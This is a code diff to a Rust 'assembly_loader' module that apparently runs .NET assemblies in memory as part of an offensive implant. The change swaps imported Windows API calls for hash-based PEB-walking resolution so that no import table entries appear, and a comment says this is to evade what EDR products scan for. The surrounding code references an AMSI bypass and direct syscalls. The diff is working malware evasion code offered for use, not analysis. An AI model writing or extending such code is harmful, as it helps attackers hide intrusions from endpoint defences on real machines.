@@ -48,23 +48,12 @@ use std::time::{Duration, Instant};
 
 use once_cell::sync::Lazy;
 use winapi::shared::guiddef::{CLSID, IID, REFIID};
-use winapi::shared::minwindef::{DWORD, LPVOID, ULONG};
+use winapi::shared::minwindef::{DWORD, HMODULE, LPDWORD, LPVOID, ULONG};
 use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
 use winapi::shared::winerror::S_OK;
-use winapi::um::combaseapi::{CoInitializeEx, CoTaskMemFree};
-use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
 use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
-use winapi::um::namedpipeapi::{CreatePipe, PeekNamedPipe};
-use winapi::um::processthreadsapi::{
-    ResumeThread, SuspendThread,
-};
-use winapi::um::synchapi::{CreateEventW, SetEvent};
 use winapi::um::winbase::WAIT_OBJECT_0;
-use winapi::um::winnt::{HANDLE, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECURITY_DESCRIPTOR};
-use winapi::um::fileapi::{ReadFile, WriteFile};
-use winapi::um::processsnapshot::HeapAlloc;
-use winapi::um::heapapi::{GetProcessHeap, HeapFree};
+use winapi::um::winnt::HANDLE;
 
 // ── Constants ────────────────────────────────────────────────────────────────
 
@@ -107,6 +96,40 @@ const IID_ICLR_RUNTIME_HOST: GUID = GUID {
 
 /// Name of the mscoree.dll export that creates CLR instances.
 const CLR_CREATE_INSTANCE: &[u8] = b"CLRCreateInstance\0";
+
+// ── Dynamic API resolution — no IAT entries ──────────────────────────────────
+//
+// All Win32 API functions are resolved at runtime via PEB walking and PE
+// export-table hashing (pe_resolve).  This avoids creating IAT entries that
+// EDR products scan for.
+
+type FnCreatePipe = unsafe extern "system" fn(
+    *mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, DWORD,
+) -> i32;
+type FnPeekNamedPipe = unsafe extern "system" fn(
+    HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD,
+) -> i32;
+type FnReadFile = unsafe extern "system" fn(
+    HANDLE, LPVOID, DWORD, LPDWORD, *mut c_void,
+) -> i32;
+type FnLoadLibraryW = unsafe extern "system" fn(LPCWSTR) -> HMODULE;
+type FnCoInitializeEx = unsafe extern "system" fn(LPVOID, DWORD) -> HRESULT;
+type FnCreateEventW = unsafe extern "system" fn(
+    *mut SECURITY_ATTRIBUTES, DWORD, DWORD, LPCWSTR,
+) -> HANDLE;
+
+/// Resolve a function pointer by DLL hash and function-name hash.
+///
+/// # Safety
+///
+/// Caller must ensure the transmuted type `T` matches the actual function
+/// signature.
+#[inline(always)]
+unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
+    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+    Some(std::mem::transmute::<_, T>(fn_addr))
+}
 
 // ── COM GUID helper ──────────────────────────────────────────────────────────
 
@@ -272,8 +295,23 @@ fn to_wide(s: &str) -> Vec<u16> {
 // ── Helper: read pipe non-blocking ──────────────────────────────────────────
 
 unsafe fn read_pipe_to_vec(handle: HANDLE, buf: &mut Vec<u8>) -> bool {
+    let peek_named_pipe: FnPeekNamedPipe = match resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"PeekNamedPipe\0"),
+    ) {
+        Some(f) => f,
+        None => return false,
+    };
+    let read_file: FnReadFile = match resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"ReadFile\0"),
+    ) {
+        Some(f) => f,
+        None => return false,
+    };
+
     let mut bytes_avail: DWORD = 0;
-    let peek_ok = PeekNamedPipe(
+    let peek_ok = peek_named_pipe(
         handle,
         std::ptr::null_mut(),
         0,
@@ -290,7 +328,7 @@ unsafe fn read_pipe_to_vec(handle: HANDLE, buf: &mut Vec<u8>) -> bool {
     }
     let mut tmp = vec![0u8; bytes_avail as usize];
     let mut bytes_read: DWORD = 0;
-    let ok = ReadFile(
+    let ok = read_file(
         handle,
         tmp.as_mut_ptr() as *mut _,
         bytes_avail,
@@ -310,19 +348,24 @@ unsafe fn read_pipe_to_vec(handle: HANDLE, buf: &mut Vec<u8>) -> bool {
 /// enumerates installed runtimes, picks the latest v4.x, and obtains
 /// ICLRRuntimeHost.
 unsafe fn init_clr_host() -> Result<*mut ICLRRuntimeHost, String> {
-    // ── Load mscoree.dll ────────────────────────────────────────────────
+    // ── Load mscoree.dll (dynamically resolved LoadLibraryW) ────────────
+    let load_library_w: FnLoadLibraryW = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"LoadLibraryW\0"),
+    ).ok_or("cannot resolve LoadLibraryW from kernel32")?;
+
     let mscoree_name = to_wide("mscoree.dll");
-    let mscoree = LoadLibraryW(mscoree_name.as_ptr());
+    let mscoree = load_library_w(mscoree_name.as_ptr());
     if mscoree.is_null() {
         return Err("failed to load mscoree.dll — .NET Framework may not be installed".to_string());
     }
     log::info!("[assembly_loader] mscoree.dll loaded at {:?}", mscoree);
 
-    // ── Get CLRCreateInstance export ─────────────────────────────────────
-    let proc = GetProcAddress(mscoree, CLR_CREATE_INSTANCE.as_ptr() as *const i8);
-    if proc.is_null() {
-        return Err("CLRCreateInstance not found in mscoree.dll".to_string());
-    }
+    // ── Get CLRCreateInstance export (dynamic PE export resolution) ──────
+    let proc = pe_resolve::get_proc_address_by_hash(
+        mscoree as usize,
+        pe_resolve::hash_str(CLR_CREATE_INSTANCE),
+    ).ok_or("CLRCreateInstance not found in mscoree.dll")?;
     let create_instance: FnCLRCreateInstance = std::mem::transmute(proc);
 
     // ── Create ICLRMetaHost ──────────────────────────────────────────────
@@ -619,9 +662,36 @@ pub unsafe fn execute(
         log::warn!("[assembly_loader] AMSI bypass verification failed — proceeding anyway");
     }
 
-    // ── COM initialization (STA) ────────────────────────────────────────
+    // ── COM initialization (STA) — dynamically resolved ─────────────────
     if !COM_INITIALIZED.load(Ordering::Relaxed) {
-        let hr = CoInitializeEx(std::ptr::null_mut(), 0x0); // COINIT_APARTMENTTHREADED
+        // Ensure ole32.dll is loaded, then resolve CoInitializeEx dynamically.
+        let ole32_hash = pe_resolve::hash_wstr(&[
+            b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
+            b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+        ]);
+        let ole32_base = match pe_resolve::get_module_handle_by_hash(ole32_hash) {
+            Some(base) => base,
+            None => {
+                // ole32.dll not yet in PEB — load it via resolved LoadLibraryW.
+                let load_lib: FnLoadLibraryW = resolve_api(
+                    pe_resolve::HASH_KERNEL32_DLL,
+                    pe_resolve::hash_str(b"LoadLibraryW\0"),
+                ).ok_or("cannot resolve LoadLibraryW for ole32 load")?;
+                let name = to_wide("ole32.dll");
+                let base = load_lib(name.as_ptr()) as usize;
+                if base == 0 {
+                    return Err("failed to load ole32.dll".to_string());
+                }
+                base
+            }
+        };
+        let co_init: FnCoInitializeEx = pe_resolve::get_proc_address_by_hash(
+            ole32_base,
+            pe_resolve::hash_str(b"CoInitializeEx\0"),
+        ).map(|addr| std::mem::transmute::<_, FnCoInitializeEx>(addr))
+         .ok_or("cannot resolve CoInitializeEx from ole32.dll")?;
+
+        let hr = co_init(std::ptr::null_mut(), 0x0); // COINIT_APARTMENTTHREADED
         if hr as u32 != S_OK as u32 && hr as u32 != 0x80010106 {
             // S_FALSE (already initialized) is fine.
             log::warn!(
@@ -689,11 +759,16 @@ pub unsafe fn execute(
     let mut stderr_read: HANDLE = std::ptr::null_mut();
     let mut stderr_write: HANDLE = std::ptr::null_mut();
 
-    if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
+    let create_pipe: FnCreatePipe = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"CreatePipe\0"),
+    ).ok_or("cannot resolve CreatePipe")?;
+
+    if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
         let _ = std::fs::remove_file(&temp_file);
         return Err("CreatePipe(stdout) failed".to_string());
     }
-    if CreatePipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
+    if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
         let _ = syscall!("NtClose", stdout_read as u64);
         let _ = syscall!("NtClose", stdout_write as u64);
         let _ = std::fs::remove_file(&temp_file);
@@ -734,7 +809,12 @@ pub unsafe fn execute(
     let timeout = timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);
     let host = &*runtime_host;
 
-    let timeout_event = CreateEventW(std::ptr::null_mut(), 1, 0, std::ptr::null_mut());
+    let create_event_w: FnCreateEventW = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"CreateEventW\0"),
+    ).ok_or("cannot resolve CreateEventW")?;
+
+    let timeout_event = create_event_w(std::ptr::null_mut(), 1, 0, std::ptr::null_mut());
     if timeout_event.is_null() {
         let _ = syscall!("NtClose", stdout_read as u64);
         let _ = syscall!("NtClose", stdout_write as u64);
